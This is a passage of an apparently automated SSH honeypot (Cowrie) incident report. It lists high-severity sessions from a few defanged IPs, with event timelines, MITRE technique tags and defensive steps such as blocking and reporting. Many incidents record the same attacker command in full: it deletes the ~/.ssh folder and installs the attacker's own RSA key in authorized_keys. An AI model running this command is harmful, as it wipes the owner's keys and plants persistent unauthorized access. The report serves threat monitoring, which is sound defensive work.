| `2026-04-15 04:23:29` | `cowrie.log.closed` |
| `2026-04-15 04:23:29` | `cowrie.session.params` |
| `2026-04-15 04:23:29` | `cowrie.command.input` |
| `2026-04-15 04:23:30` | `cowrie.session.file_download` |
| `2026-04-15 04:23:30` | `cowrie.log.closed` |
| `2026-04-15 04:23:30` | `cowrie.session.params` |
| `2026-04-15 04:23:30` | `cowrie.command.input` |
| `2026-04-15 04:23:31` | `cowrie.log.closed` |
| `2026-04-15 04:23:31` | `cowrie.session.params` |
| `2026-04-15 04:23:31` | `cowrie.command.input` |
| `2026-04-15 04:23:32` | `cowrie.log.closed` |
| `2026-04-15 04:23:33` | `cowrie.session.params` |
| `2026-04-15 04:23:33` | `cowrie.command.input` |
| `2026-04-15 04:23:33` | `cowrie.command.input` |
| `2026-04-15 04:23:33` | `cowrie.log.closed` |
| `2026-04-15 04:23:33` | `cowrie.session.params` |
| `2026-04-15 04:23:33` | `cowrie.command.input` |
| `2026-04-15 04:23:34` | `cowrie.log.closed` |
| `2026-04-15 04:23:34` | `cowrie.session.params` |
| `2026-04-15 04:23:34` | `cowrie.command.input` |
| `2026-04-15 04:23:34` | `cowrie.log.closed` |
| `2026-04-15 04:23:35` | `cowrie.session.params` |
| `2026-04-15 04:23:35` | `cowrie.command.input` |
| `2026-04-15 04:23:36` | `cowrie.log.closed` |
| `2026-04-15 04:23:36` | `cowrie.session.params` |
| `2026-04-15 04:23:36` | `cowrie.command.input` |
| `2026-04-15 04:23:37` | `cowrie.log.closed` |
| `2026-04-15 04:23:37` | `cowrie.session.params` |
| `2026-04-15 04:23:37` | `cowrie.command.input` |
| `2026-04-15 04:23:38` | `cowrie.log.closed` |
| `2026-04-15 04:23:39` | `cowrie.session.params` |
| `2026-04-15 04:23:39` | `cowrie.command.input` |
| `2026-04-15 04:23:39` | `cowrie.log.closed` |
| `2026-04-15 04:23:39` | `cowrie.session.params` |
| `2026-04-15 04:23:39` | `cowrie.command.input` |
| `2026-04-15 04:23:40` | `cowrie.log.closed` |
| `2026-04-15 04:23:40` | `cowrie.session.params` |
| `2026-04-15 04:23:40` | `cowrie.command.input` |
| `2026-04-15 04:23:40` | `cowrie.log.closed` |
| `2026-04-15 04:23:40` | `cowrie.session.params` |
| `2026-04-15 04:23:40` | `cowrie.command.input` |
| `2026-04-15 04:23:40` | `cowrie.log.closed` |
| `2026-04-15 04:23:41` | `cowrie.session.params` |
| `2026-04-15 04:23:41` | `cowrie.command.input` |
| `2026-04-15 04:23:41` | `cowrie.log.closed` |
| `2026-04-15 04:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]205` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3645307a37

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:23 |
| **Last Seen** | 2026-04-15 04:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:23:17` | `cowrie.session.connect` |
| `2026-04-15 04:23:17` | `cowrie.client.version` |
| `2026-04-15 04:23:17` | `cowrie.client.kex` |
| `2026-04-15 04:23:18` | `cowrie.login.success` |
| `2026-04-15 04:23:18` | `cowrie.session.params` |
| `2026-04-15 04:23:18` | `cowrie.command.input` |
| `2026-04-15 04:23:18` | `cowrie.command.failed` |
| `2026-04-15 04:23:18` | `cowrie.log.closed` |
| `2026-04-15 04:23:19` | `cowrie.session.params` |
| `2026-04-15 04:23:19` | `cowrie.command.input` |
| `2026-04-15 04:23:19` | `cowrie.session.file_download` |
| `2026-04-15 04:23:19` | `cowrie.log.closed` |
| `2026-04-15 04:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5624b7ace815

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:23 |
| **Last Seen** | 2026-04-15 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:23:21` | `cowrie.session.connect` |
| `2026-04-15 04:23:21` | `cowrie.client.version` |
| `2026-04-15 04:23:21` | `cowrie.client.kex` |
| `2026-04-15 04:23:22` | `cowrie.login.success` |
| `2026-04-15 04:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac19b967fc1

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:23 |
| **Last Seen** | 2026-04-15 04:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:23:24` | `cowrie.session.connect` |
| `2026-04-15 04:23:24` | `cowrie.client.version` |
| `2026-04-15 04:23:25` | `cowrie.client.kex` |
| `2026-04-15 04:23:26` | `cowrie.login.success` |
| `2026-04-15 04:23:26` | `cowrie.session.params` |
| `2026-04-15 04:23:26` | `cowrie.command.input` |
| `2026-04-15 04:23:26` | `cowrie.command.failed` |
| `2026-04-15 04:23:27` | `cowrie.log.closed` |
| `2026-04-15 04:23:27` | `cowrie.session.params` |
| `2026-04-15 04:23:27` | `cowrie.command.input` |
| `2026-04-15 04:23:27` | `cowrie.session.file_download` |
| `2026-04-15 04:23:27` | `cowrie.log.closed` |
| `2026-04-15 04:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aec8e25542e

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:23 |
| **Last Seen** | 2026-04-15 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:23:30` | `cowrie.session.connect` |
| `2026-04-15 04:23:30` | `cowrie.client.version` |
| `2026-04-15 04:23:31` | `cowrie.client.kex` |
| `2026-04-15 04:23:32` | `cowrie.login.success` |
| `2026-04-15 04:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7684f2937347

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:24 |
| **Last Seen** | 2026-04-15 04:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:24:42` | `cowrie.session.connect` |
| `2026-04-15 04:24:42` | `cowrie.client.version` |
| `2026-04-15 04:24:42` | `cowrie.client.kex` |
| `2026-04-15 04:24:43` | `cowrie.login.success` |
| `2026-04-15 04:24:44` | `cowrie.session.params` |
| `2026-04-15 04:24:44` | `cowrie.command.input` |
| `2026-04-15 04:24:44` | `cowrie.command.failed` |
| `2026-04-15 04:24:44` | `cowrie.log.closed` |
| `2026-04-15 04:24:44` | `cowrie.session.params` |
| `2026-04-15 04:24:44` | `cowrie.command.input` |
| `2026-04-15 04:24:45` | `cowrie.session.file_download` |
| `2026-04-15 04:24:45` | `cowrie.log.closed` |
| `2026-04-15 04:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba467310369b

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:24 |
| **Last Seen** | 2026-04-15 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:24:48` | `cowrie.session.connect` |
| `2026-04-15 04:24:48` | `cowrie.client.version` |
| `2026-04-15 04:24:48` | `cowrie.client.kex` |
| `2026-04-15 04:24:49` | `cowrie.login.success` |
| `2026-04-15 04:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e6c319ad9f

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:25 |
| **Last Seen** | 2026-04-15 04:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:25:25` | `cowrie.session.connect` |
| `2026-04-15 04:25:25` | `cowrie.client.version` |
| `2026-04-15 04:25:25` | `cowrie.client.kex` |
| `2026-04-15 04:25:26` | `cowrie.login.success` |
| `2026-04-15 04:25:26` | `cowrie.session.params` |
| `2026-04-15 04:25:26` | `cowrie.command.input` |
| `2026-04-15 04:25:26` | `cowrie.command.failed` |
| `2026-04-15 04:25:26` | `cowrie.log.closed` |
| `2026-04-15 04:25:27` | `cowrie.session.params` |
| `2026-04-15 04:25:27` | `cowrie.command.input` |
| `2026-04-15 04:25:27` | `cowrie.session.file_download` |
| `2026-04-15 04:25:27` | `cowrie.log.closed` |
| `2026-04-15 04:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba69de6684a

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:25 |
| **Last Seen** | 2026-04-15 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:25:29` | `cowrie.session.connect` |
| `2026-04-15 04:25:29` | `cowrie.client.version` |
| `2026-04-15 04:25:30` | `cowrie.client.kex` |
| `2026-04-15 04:25:30` | `cowrie.login.success` |
| `2026-04-15 04:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f14901de8827

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:26 |
| **Last Seen** | 2026-04-15 04:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:26:32` | `cowrie.session.connect` |
| `2026-04-15 04:26:32` | `cowrie.client.version` |
| `2026-04-15 04:26:32` | `cowrie.client.kex` |
| `2026-04-15 04:26:33` | `cowrie.login.success` |
| `2026-04-15 04:26:33` | `cowrie.session.params` |
| `2026-04-15 04:26:33` | `cowrie.command.input` |
| `2026-04-15 04:26:33` | `cowrie.command.failed` |
| `2026-04-15 04:26:33` | `cowrie.log.closed` |
| `2026-04-15 04:26:34` | `cowrie.session.params` |
| `2026-04-15 04:26:34` | `cowrie.command.input` |
| `2026-04-15 04:26:34` | `cowrie.session.file_download` |
| `2026-04-15 04:26:34` | `cowrie.log.closed` |
| `2026-04-15 04:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef31a58443ed

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:26 |
| **Last Seen** | 2026-04-15 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:26:36` | `cowrie.session.connect` |
| `2026-04-15 04:26:36` | `cowrie.client.version` |
| `2026-04-15 04:26:36` | `cowrie.client.kex` |
| `2026-04-15 04:26:37` | `cowrie.login.success` |
| `2026-04-15 04:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c3488dad57

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:28 |
| **Last Seen** | 2026-04-15 04:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:28:49` | `cowrie.session.connect` |
| `2026-04-15 04:28:49` | `cowrie.client.version` |
| `2026-04-15 04:28:50` | `cowrie.client.kex` |
| `2026-04-15 04:28:50` | `cowrie.login.success` |
| `2026-04-15 04:28:51` | `cowrie.session.params` |
| `2026-04-15 04:28:51` | `cowrie.command.input` |
| `2026-04-15 04:28:51` | `cowrie.command.failed` |
| `2026-04-15 04:28:51` | `cowrie.log.closed` |
| `2026-04-15 04:28:51` | `cowrie.session.params` |
| `2026-04-15 04:28:51` | `cowrie.command.input` |
| `2026-04-15 04:28:51` | `cowrie.session.file_download` |
| `2026-04-15 04:28:51` | `cowrie.log.closed` |
| `2026-04-15 04:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af0260ba70b

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:28 |
| **Last Seen** | 2026-04-15 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:28:54` | `cowrie.session.connect` |
| `2026-04-15 04:28:54` | `cowrie.client.version` |
| `2026-04-15 04:28:54` | `cowrie.client.kex` |
| `2026-04-15 04:28:55` | `cowrie.login.success` |
| `2026-04-15 04:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3e7e0285004

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:32 |
| **Last Seen** | 2026-04-15 04:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:32:09` | `cowrie.session.connect` |
| `2026-04-15 04:32:09` | `cowrie.client.version` |
| `2026-04-15 04:32:09` | `cowrie.client.kex` |
| `2026-04-15 04:32:09` | `cowrie.login.success` |
| `2026-04-15 04:32:10` | `cowrie.session.params` |
| `2026-04-15 04:32:10` | `cowrie.command.input` |
| `2026-04-15 04:32:10` | `cowrie.command.failed` |
| `2026-04-15 04:32:10` | `cowrie.log.closed` |
| `2026-04-15 04:32:10` | `cowrie.session.params` |
| `2026-04-15 04:32:10` | `cowrie.command.input` |
| `2026-04-15 04:32:11` | `cowrie.session.file_download` |
| `2026-04-15 04:32:11` | `cowrie.log.closed` |
| `2026-04-15 04:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a96b3250e73

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:32 |
| **Last Seen** | 2026-04-15 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:32:13` | `cowrie.session.connect` |
| `2026-04-15 04:32:13` | `cowrie.client.version` |
| `2026-04-15 04:32:13` | `cowrie.client.kex` |
| `2026-04-15 04:32:14` | `cowrie.login.success` |
| `2026-04-15 04:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45fcad8f11c

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:33 |
| **Last Seen** | 2026-04-15 04:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:33:12` | `cowrie.session.connect` |
| `2026-04-15 04:33:12` | `cowrie.client.version` |
| `2026-04-15 04:33:12` | `cowrie.client.kex` |
| `2026-04-15 04:33:13` | `cowrie.login.success` |
| `2026-04-15 04:33:13` | `cowrie.session.params` |
| `2026-04-15 04:33:13` | `cowrie.command.input` |
| `2026-04-15 04:33:13` | `cowrie.command.failed` |
| `2026-04-15 04:33:13` | `cowrie.log.closed` |
| `2026-04-15 04:33:14` | `cowrie.session.params` |
| `2026-04-15 04:33:14` | `cowrie.command.input` |
| `2026-04-15 04:33:14` | `cowrie.session.file_download` |
| `2026-04-15 04:33:14` | `cowrie.log.closed` |
